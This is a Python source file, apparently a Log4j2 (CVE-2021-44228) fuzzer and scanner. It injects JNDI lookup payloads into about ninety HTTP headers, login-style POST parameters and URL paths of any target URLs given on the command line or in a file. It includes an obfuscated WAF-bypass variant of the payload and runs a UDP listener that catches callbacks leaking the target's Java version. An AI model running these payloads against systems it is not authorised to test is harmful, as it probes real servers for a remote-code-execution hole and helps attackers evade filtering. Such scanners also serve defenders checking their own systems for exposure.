# !/usr/bin/python
# -*- coding:utf-8 -*-
# __Author__: VVzv

import sys
import time
import random
import textwrap
import argparse

import requests

from socket import *
from threading import Thread

import colorama
if "win32" in sys.platform.lower():
    colorama.init(autoreset=True)

time_out = 7
rec_size = 1024

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
}


class Log4gScanner:

    def __init__(self, urls, show_fuzz_info=0, bypass_waf=0):
        '''
        param: urls [ url list, file or link]
        param: show_fuzz_info [1 show; 0 none]
        param: bypass_waf [0 false; 1 true]
        '''
        self.urls           = urls
        self.port           = None
        self.url_list       = []
        self.payload        = ""
        self.self_ip        = ""
        self.vuln_list      = {}
        self.t1             = None
        self.t2             = None
        self.response       = ""
        self.vuln_res       = ""
        self.bypass_waf_c   = bypass_waf
        self.show_fuzz_info = show_fuzz_info

    def logger(self, color=0, text="", *args, **kwargs):
        if color == 0: # cyan
            print("\033[36m{}\033[0m".format(text), *args, **kwargs)
        if color == 1: # green
            print("\033[32m{}\033[0m".format(text), *args, **kwargs)
        if color == 2: # red
            print("\033[31m{}\033[0m".format(text), *args, **kwargs)
        if color == 3: # white
            print("\033[37m{}\033[0m".format(text), *args, **kwargs)
        if color == 4: # yellow
            print("\033[33m{}\033[0m".format(text), *args, **kwargs)
        if color == 5: # magenta
            print("\033[35m{}\033[0m".format(text), *args, **kwargs)

    def getSelfIp(self):
        import socket
        host_name = socket.gethostname()
        self.self_ip = socket.gethostbyname(host_name)

    # log4j2 payload
    def getPayload(self):
        if self.bypass_waf_c == 1:
            # bypass waf payload
            self.payload = "${${env:NaN:-j}n${env:NaN:-d}i${env:NaN:-:}${env:NaN:-d}ns${env:NaN:-:}//%s:%s/${java:version}}" %(self.self_ip, self.port)
        else:
            # default payload
            self.payload = "${jndi:dns://%s:%s/${java:version}}" %(self.self_ip, self.port)

    def urlsCreate(self):
        try:
            file_urls = open(self.urls, "r").readlines()
            for furl in file_urls:
                if furl.strip() != "":
                    self.urlFilter(furl.strip())
        except:
            self.urlFilter(self.urls)

    def urlFilter(self, url):
        url_split = url.split("/")
        # print(url_split)
        url_d = url_split[0] + "//" + url_split[2]
        if url[-1] == "/":
            url = url[:-1]
        if url not in self.url_list:
            self.url_list.append(url)
        if url_d not in self.url_list:
            self.url_list.append(url_d)

    def requestInfo(self, response):
        format_headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items())
        if response.request.body == None:
            info = textwrap.dedent('''
                   ********************** request **********************
                   {req.method} {req.path_url}
                   {reqhdrs}
                   ********************** response **********************
               ''').format(
                req=response.request,
                reqhdrs=format_headers(response.request.headers),
                reshdrs=format_headers(response.headers),
            )
            info += "\n{}".format(self.vuln_res)
            self.vuln_list.update({response.request.url: info})

        info = textwrap.dedent('''
            ********************** request **********************
            {req.method} {req.path_url}
            {reqhdrs}
    
            {req.body}
            ********************** response **********************
        ''').format(
            req=response.request,
            reqhdrs=format_headers(response.request.headers),
            reshdrs=format_headers(response.headers),
        )
        info += "{}".format(self.vuln_res)
        self.vuln_list.update({response.request.url: info})

    def bin2ascii(self, hex_str):
        s = ""
        for h in hex_str:
            if h >= 10 and h < 127:
                s += chr(h)
        return s

    def udpServer(self):
        self.udp = socket(AF_INET, SOCK_DGRAM)
        bind_addr = ("", self.port)
        self.logger(1, text="[+] open udp server in {}:{}".format(self.self_ip, self.port))
        self.udp.bind(bind_addr)
        while 1:
            try:
                res = self.udp.recvfrom(rec_size)
                d_data, des_ip_and_port = res
                res_data = self.bin2ascii(d_data)
                if ("java" in res_data.lower()) and ("version" in res_data.lower()):
                    udp_server = self.self_ip + ":" + str(self.port)
                    res_info  = "UDP-Server: {}\n".format(udp_server)
                    res_info += "Receive-Ip: {}:{}\n".format(des_ip_and_port[0], des_ip_and_port[1])
                    res_info += "Receive-Info: {}\n".format("Java" + res_data.lower().split("java")[-1])
                    res_info += "*" * 53
                    self.logger(2, text="[-][{}] Find log4j2 Vulnerability(CVE-2021-44228).".format(des_ip_and_port[0]))
                    self.vuln_res = res_info
                    self.udp.close()
                    return None
            except Exception as e:
                if "Bad file descriptor" not in str(e):
                    self.logger(2, "[!!!] udp Server Error: {}".format(e))
                    self.udp.close()
                    return None
                else:
                    return None

    def doGet(self, url, headers):
        # print(url, fuzz_key)
        if not self.t1.is_alive() and len(self.vuln_res) > 0:
            # self.logger(text="[!] Udp server stop...")
            return 1
        try:
            self.response = requests.get(url, headers=headers, verify=False, timeout=time_out)
            return self.response
        except Exception as e:
            if "timed out" in str(e):
                self.logger(4, "[!!!] Request time out, Check your network...")
                self.logger(2, "[-] Closed program...")
                self.udp.close()
                sys.exit(0)
            return 0

    def doPost(self, url, headers, data):
        # print(url, fuzz_key)
        if not self.t1.is_alive() and len(self.vuln_res) > 0:
            # self.logger(text="[!] Udp server stop...")
            return 1
        try:
            self.response = requests.post(url, data=data, headers=headers, verify=False, timeout=time_out)
            return self.response
        except Exception as e:
            if "timed out" in str(e):
                self.logger(4, "[!!!] Request time out, Check your network...")
                self.logger(2, "[-] Closed program...")
                self.udp.close()
                sys.exit(0)
            return 0

    def fuzzHeader(self, url, payload):
        # self.logger(4, "[*] 正在Fuzz Header...")
        headers_fuzz_list = {
            "Accept-Charset": payload,
            "Accept-Datetime": payload,
            "Accept-Encoding": payload,
            "Accept-Language": payload,
            "Ali-CDN-Real-IP": payload,
            "Authorization": payload,
            "Cache-Control": payload,
            "Cdn-Real-Ip": payload,
            "Cdn-Src-Ip": payload,
            "CF-Connecting-IP": payload,
            "Client-IP": payload,
            "Contact": payload,
            "Cookie": payload,
            "DNT": payload,
            "Fastly-Client-Ip": payload,
            "Forwarded-For-Ip": payload,
            "Forwarded-For": payload,
            "Forwarded": payload,
            "Forwarded-Proto": payload,
            "From": payload,
            "If-Modified-Since": payload,
            "Max-Forwards": payload,
            "Originating-Ip": payload,
            "Origin": payload,
            "Pragma": payload,
            "Proxy-Client-IP": payload,
            "Proxy": payload,
            "Referer": payload,
            "TE": payload,
            "True-Client-Ip": payload,
            "True-Client-IP": payload,
            "Upgrade": payload,
            "User-Agent": payload,
            "Via": payload,
            "Warning": payload,
            "WL-Proxy-Client-IP": payload,
            "X-Api-Version": payload,
            "X-Att-Deviceid": payload,
            "X-ATT-DeviceId": payload,
            "X-Client-IP"
            "X-Client-Ip": payload,
            "X-Client-IP": payload,
            "X-Cluster-Client-IP": payload,
            "X-Correlation-ID": payload,
            "X-Csrf-Token": payload,
            "X-CSRFToken": payload,
            "X-Do-Not-Track": payload,
            "X-Foo-Bar": payload,
            "X-Foo": payload,
            "X-Forwarded-By": payload,
            "X-Forwarded-For-Original": payload,
            "X-Forwarded-For": payload,
            "X-Forwarded-Host": payload,
            "X-Forwarded": payload,
            "X-Forwarded-Port": payload,
            "X-Forwarded-Protocol": payload,
            "X-Forwarded-Proto": payload,
            "X-Forwarded-Scheme": payload,
            "X-Forwarded-Server": payload,
            "X-Forwarded-Ssl": payload,
            "X-Forwarder-For": payload,
            "X-Forward-For": payload,
            "X-Forward-Proto": payload,
            "X-Frame-Options": payload,
            "X-From": payload,
            "X-Geoip-Country": payload,
            "X-Host": payload,
            "X-Http-Destinationurl": payload,
            "X-Http-Host-Override": payload,
            "X-Http-Method-Override": payload,
            "X-HTTP-Method-Override": payload,
            "X-Http-Method": payload,
            "X-Http-Path-Override": payload,
            "X-Https": payload,
            "X-Htx-Agent": payload,
            "X-Hub-Signature": payload,
            "X-If-Unmodified-Since": payload,
            "X-Imbo-Test-Config": payload,
            "X-Insight": payload,
            "X-Ip": payload,
            "X-Ip-Trail": payload,
            "X-Leakix": payload,
            "X-Original-URL": payload,
            "X-Originating-IP": payload,
            "X-ProxyUser-Ip": payload,
            "X-Real-Ip": payload,
            "X-Remote-Addr": payload,
            "X-Remote-IP": payload,
            "X-Requested-With": payload,
            "X-Request-ID": payload,
            "X-True-IP": payload,
            "X-UIDH": payload,
            "X-Wap-Profile": payload,
            "X-WAP-Profile": payload,
            "X-XSRF-TOKEN": payload,
        }
        for k,v in headers_fuzz_list.items():
            if self.show_fuzz_info == 1:
                self.logger(text="[*] Fuzzing Header：{}".format(k))
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
            }
            headers[k] = v
            r = self.doGet(url, headers=headers)
            del headers[k]
            if r == 1:
                self.requestInfo(self.response)
                return 1
        return 0

    def fuzzParam(self, url, payload):
        # self.logger(4, "[*] 正在Fuzz Param...")
        param_fuzz_list = {
            "user": payload,
            "pass": payload,
            "struts.token.name": payload,
            "username": payload,
            "password": payload,
            "login": payload,
            "email": payload,
            "principal": payload,
            "payload": payload,
            "token": payload,
            "verify": payload,
        }
        for k,v in param_fuzz_list.items():
            if self.show_fuzz_info == 1:
                self.logger(text="[*] Fuzzing Param：{}".format(k))
            data = {k: v}
            r = self.doPost(url, headers=headers, data=data)
            if r == 1:
                self.requestInfo(self.response)
                return 1
        return 0

    def fuzzPath(self, path_fuzz_list, url, payload):
        # self.logger(4, "[*] Fuzzing URL...")
        for path in path_fuzz_list:
            if "?" in path or "=" in path or path[-1] == "/":
                if self.show_fuzz_info == 1:
                    self.logger(text="[*] Fuzzing Url：" + path)
                fuzz_url = url + path + payload
                r = self.doGet(fuzz_url, headers=headers)
                if r == 1:
                    self.requestInfo(self.response)
                    return 1
        return 0

    def fuzz(self, url, payload):
        path_fuzz_list = [
            "/"
            "/hello",
            "/index",
            "/login",
            "/index.action",
            "/?id=",
            "/?username=",
            "/?page=",
            "/websso/SAML2/SLO/vsphere.local?SAMLRequest=",
            "/struts/utils.js",
            "/solr/admin/collections?wt=json&action=",
            "/druid/coordinator/v1/lookups/config/",
            "/wiki/",
        ]
        self.logger(text="[*] Fuzzing, Please wait...")
        fp = self.fuzzPath(path_fuzz_list, url, payload)
        if fp == 1:
            return
        for path in path_fuzz_list:
            fuzz_url = url + path
            fh = self.fuzzHeader(fuzz_url, payload)
            if fh == 1:
                return
            fp = self.fuzzParam(fuzz_url, payload)
            if fp == 1:
                return
        # time.sleep(0.3)
        self.udp.close()

    def showRet(self):
        if len(self.vuln_list) > 0:
            for k, v in self.vuln_list.items():
                self.logger(2, "\n[+] VULN_LINK: {}".format(k), end="")
                self.logger(2, v)
        return

    def timeFilter(self, start_time, end_time):
        use_time = end_time - start_time
        m_time = 0
        s_time = 0
        if use_time >= 60:
            m_time = int(use_time) // 60
            s_time = int(use_time) % 60
        else:
            s_time = int(use_time)
        return m_time, s_time

    def main(self):
        self.logger(5, text="[#] Log4j2 Vulnerability (CVE-2021-44228) Fuzz/Scanner.\n\t\t\t\t\t\t————By VVzv")
        start_time = time.time()
        self.getSelfIp()
        self.urlsCreate()
        for url in self.url_list:
            self.close_num = 0
            self.port = random.randint(12345, 20100)
            self.getPayload()
            self.logger(1, text="[+] Start Fuzzing Target: {}".format(url))
            self.logger(4, text="[#] Payload: {}".format(self.payload))
            self.t1 = Thread(target=self.udpServer)
            self.t2 = Thread(target=self.fuzz, args=(url, self.payload))
            self.t1.start()
            time.sleep(0.1)
            self.t2.start()
            self.t1.join()
            self.t2.join()
        end_time = time.time()
        m_time, s_time = self.timeFilter(start_time, end_time)
        self.logger(1, text="[+] Fuzz end, use {}min {}s.".format(m_time, s_time))
        self.logger(1, "#" * 50)
        self.showRet()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage="python3 log4jFuzz.py [options]", add_help=False)
    parser.add_argument("-u", "--url", dest="url", type=str, help="Target URL. (e.g. http://example.com )")
    parser.add_argument("-f", "--file", dest="file", help="Select a target list file. (e.g. list.txt )")
    parser.add_argument('-v', '--verbosity', action="store_true", help="Show fuzz info.")
    parser.add_argument("--bypass", dest="bypass", action="store_true", help="Use bypass waf payload. (Default False)")
    args = parser.parse_args()
    show_fuzz_info = 0
    bypass = 0
    if args.verbosity:
        show_fuzz_info = 1
    if args.bypass:
        bypass = 1
    if args.url:
        Log4gScanner(urls=args.url, show_fuzz_info=show_fuzz_info, bypass_waf=bypass).main()
    elif args.file:
        Log4gScanner(urls=args.file, show_fuzz_info=show_fuzz_info, bypass_waf=bypass).main()
    else:
        parser.print_help()
#

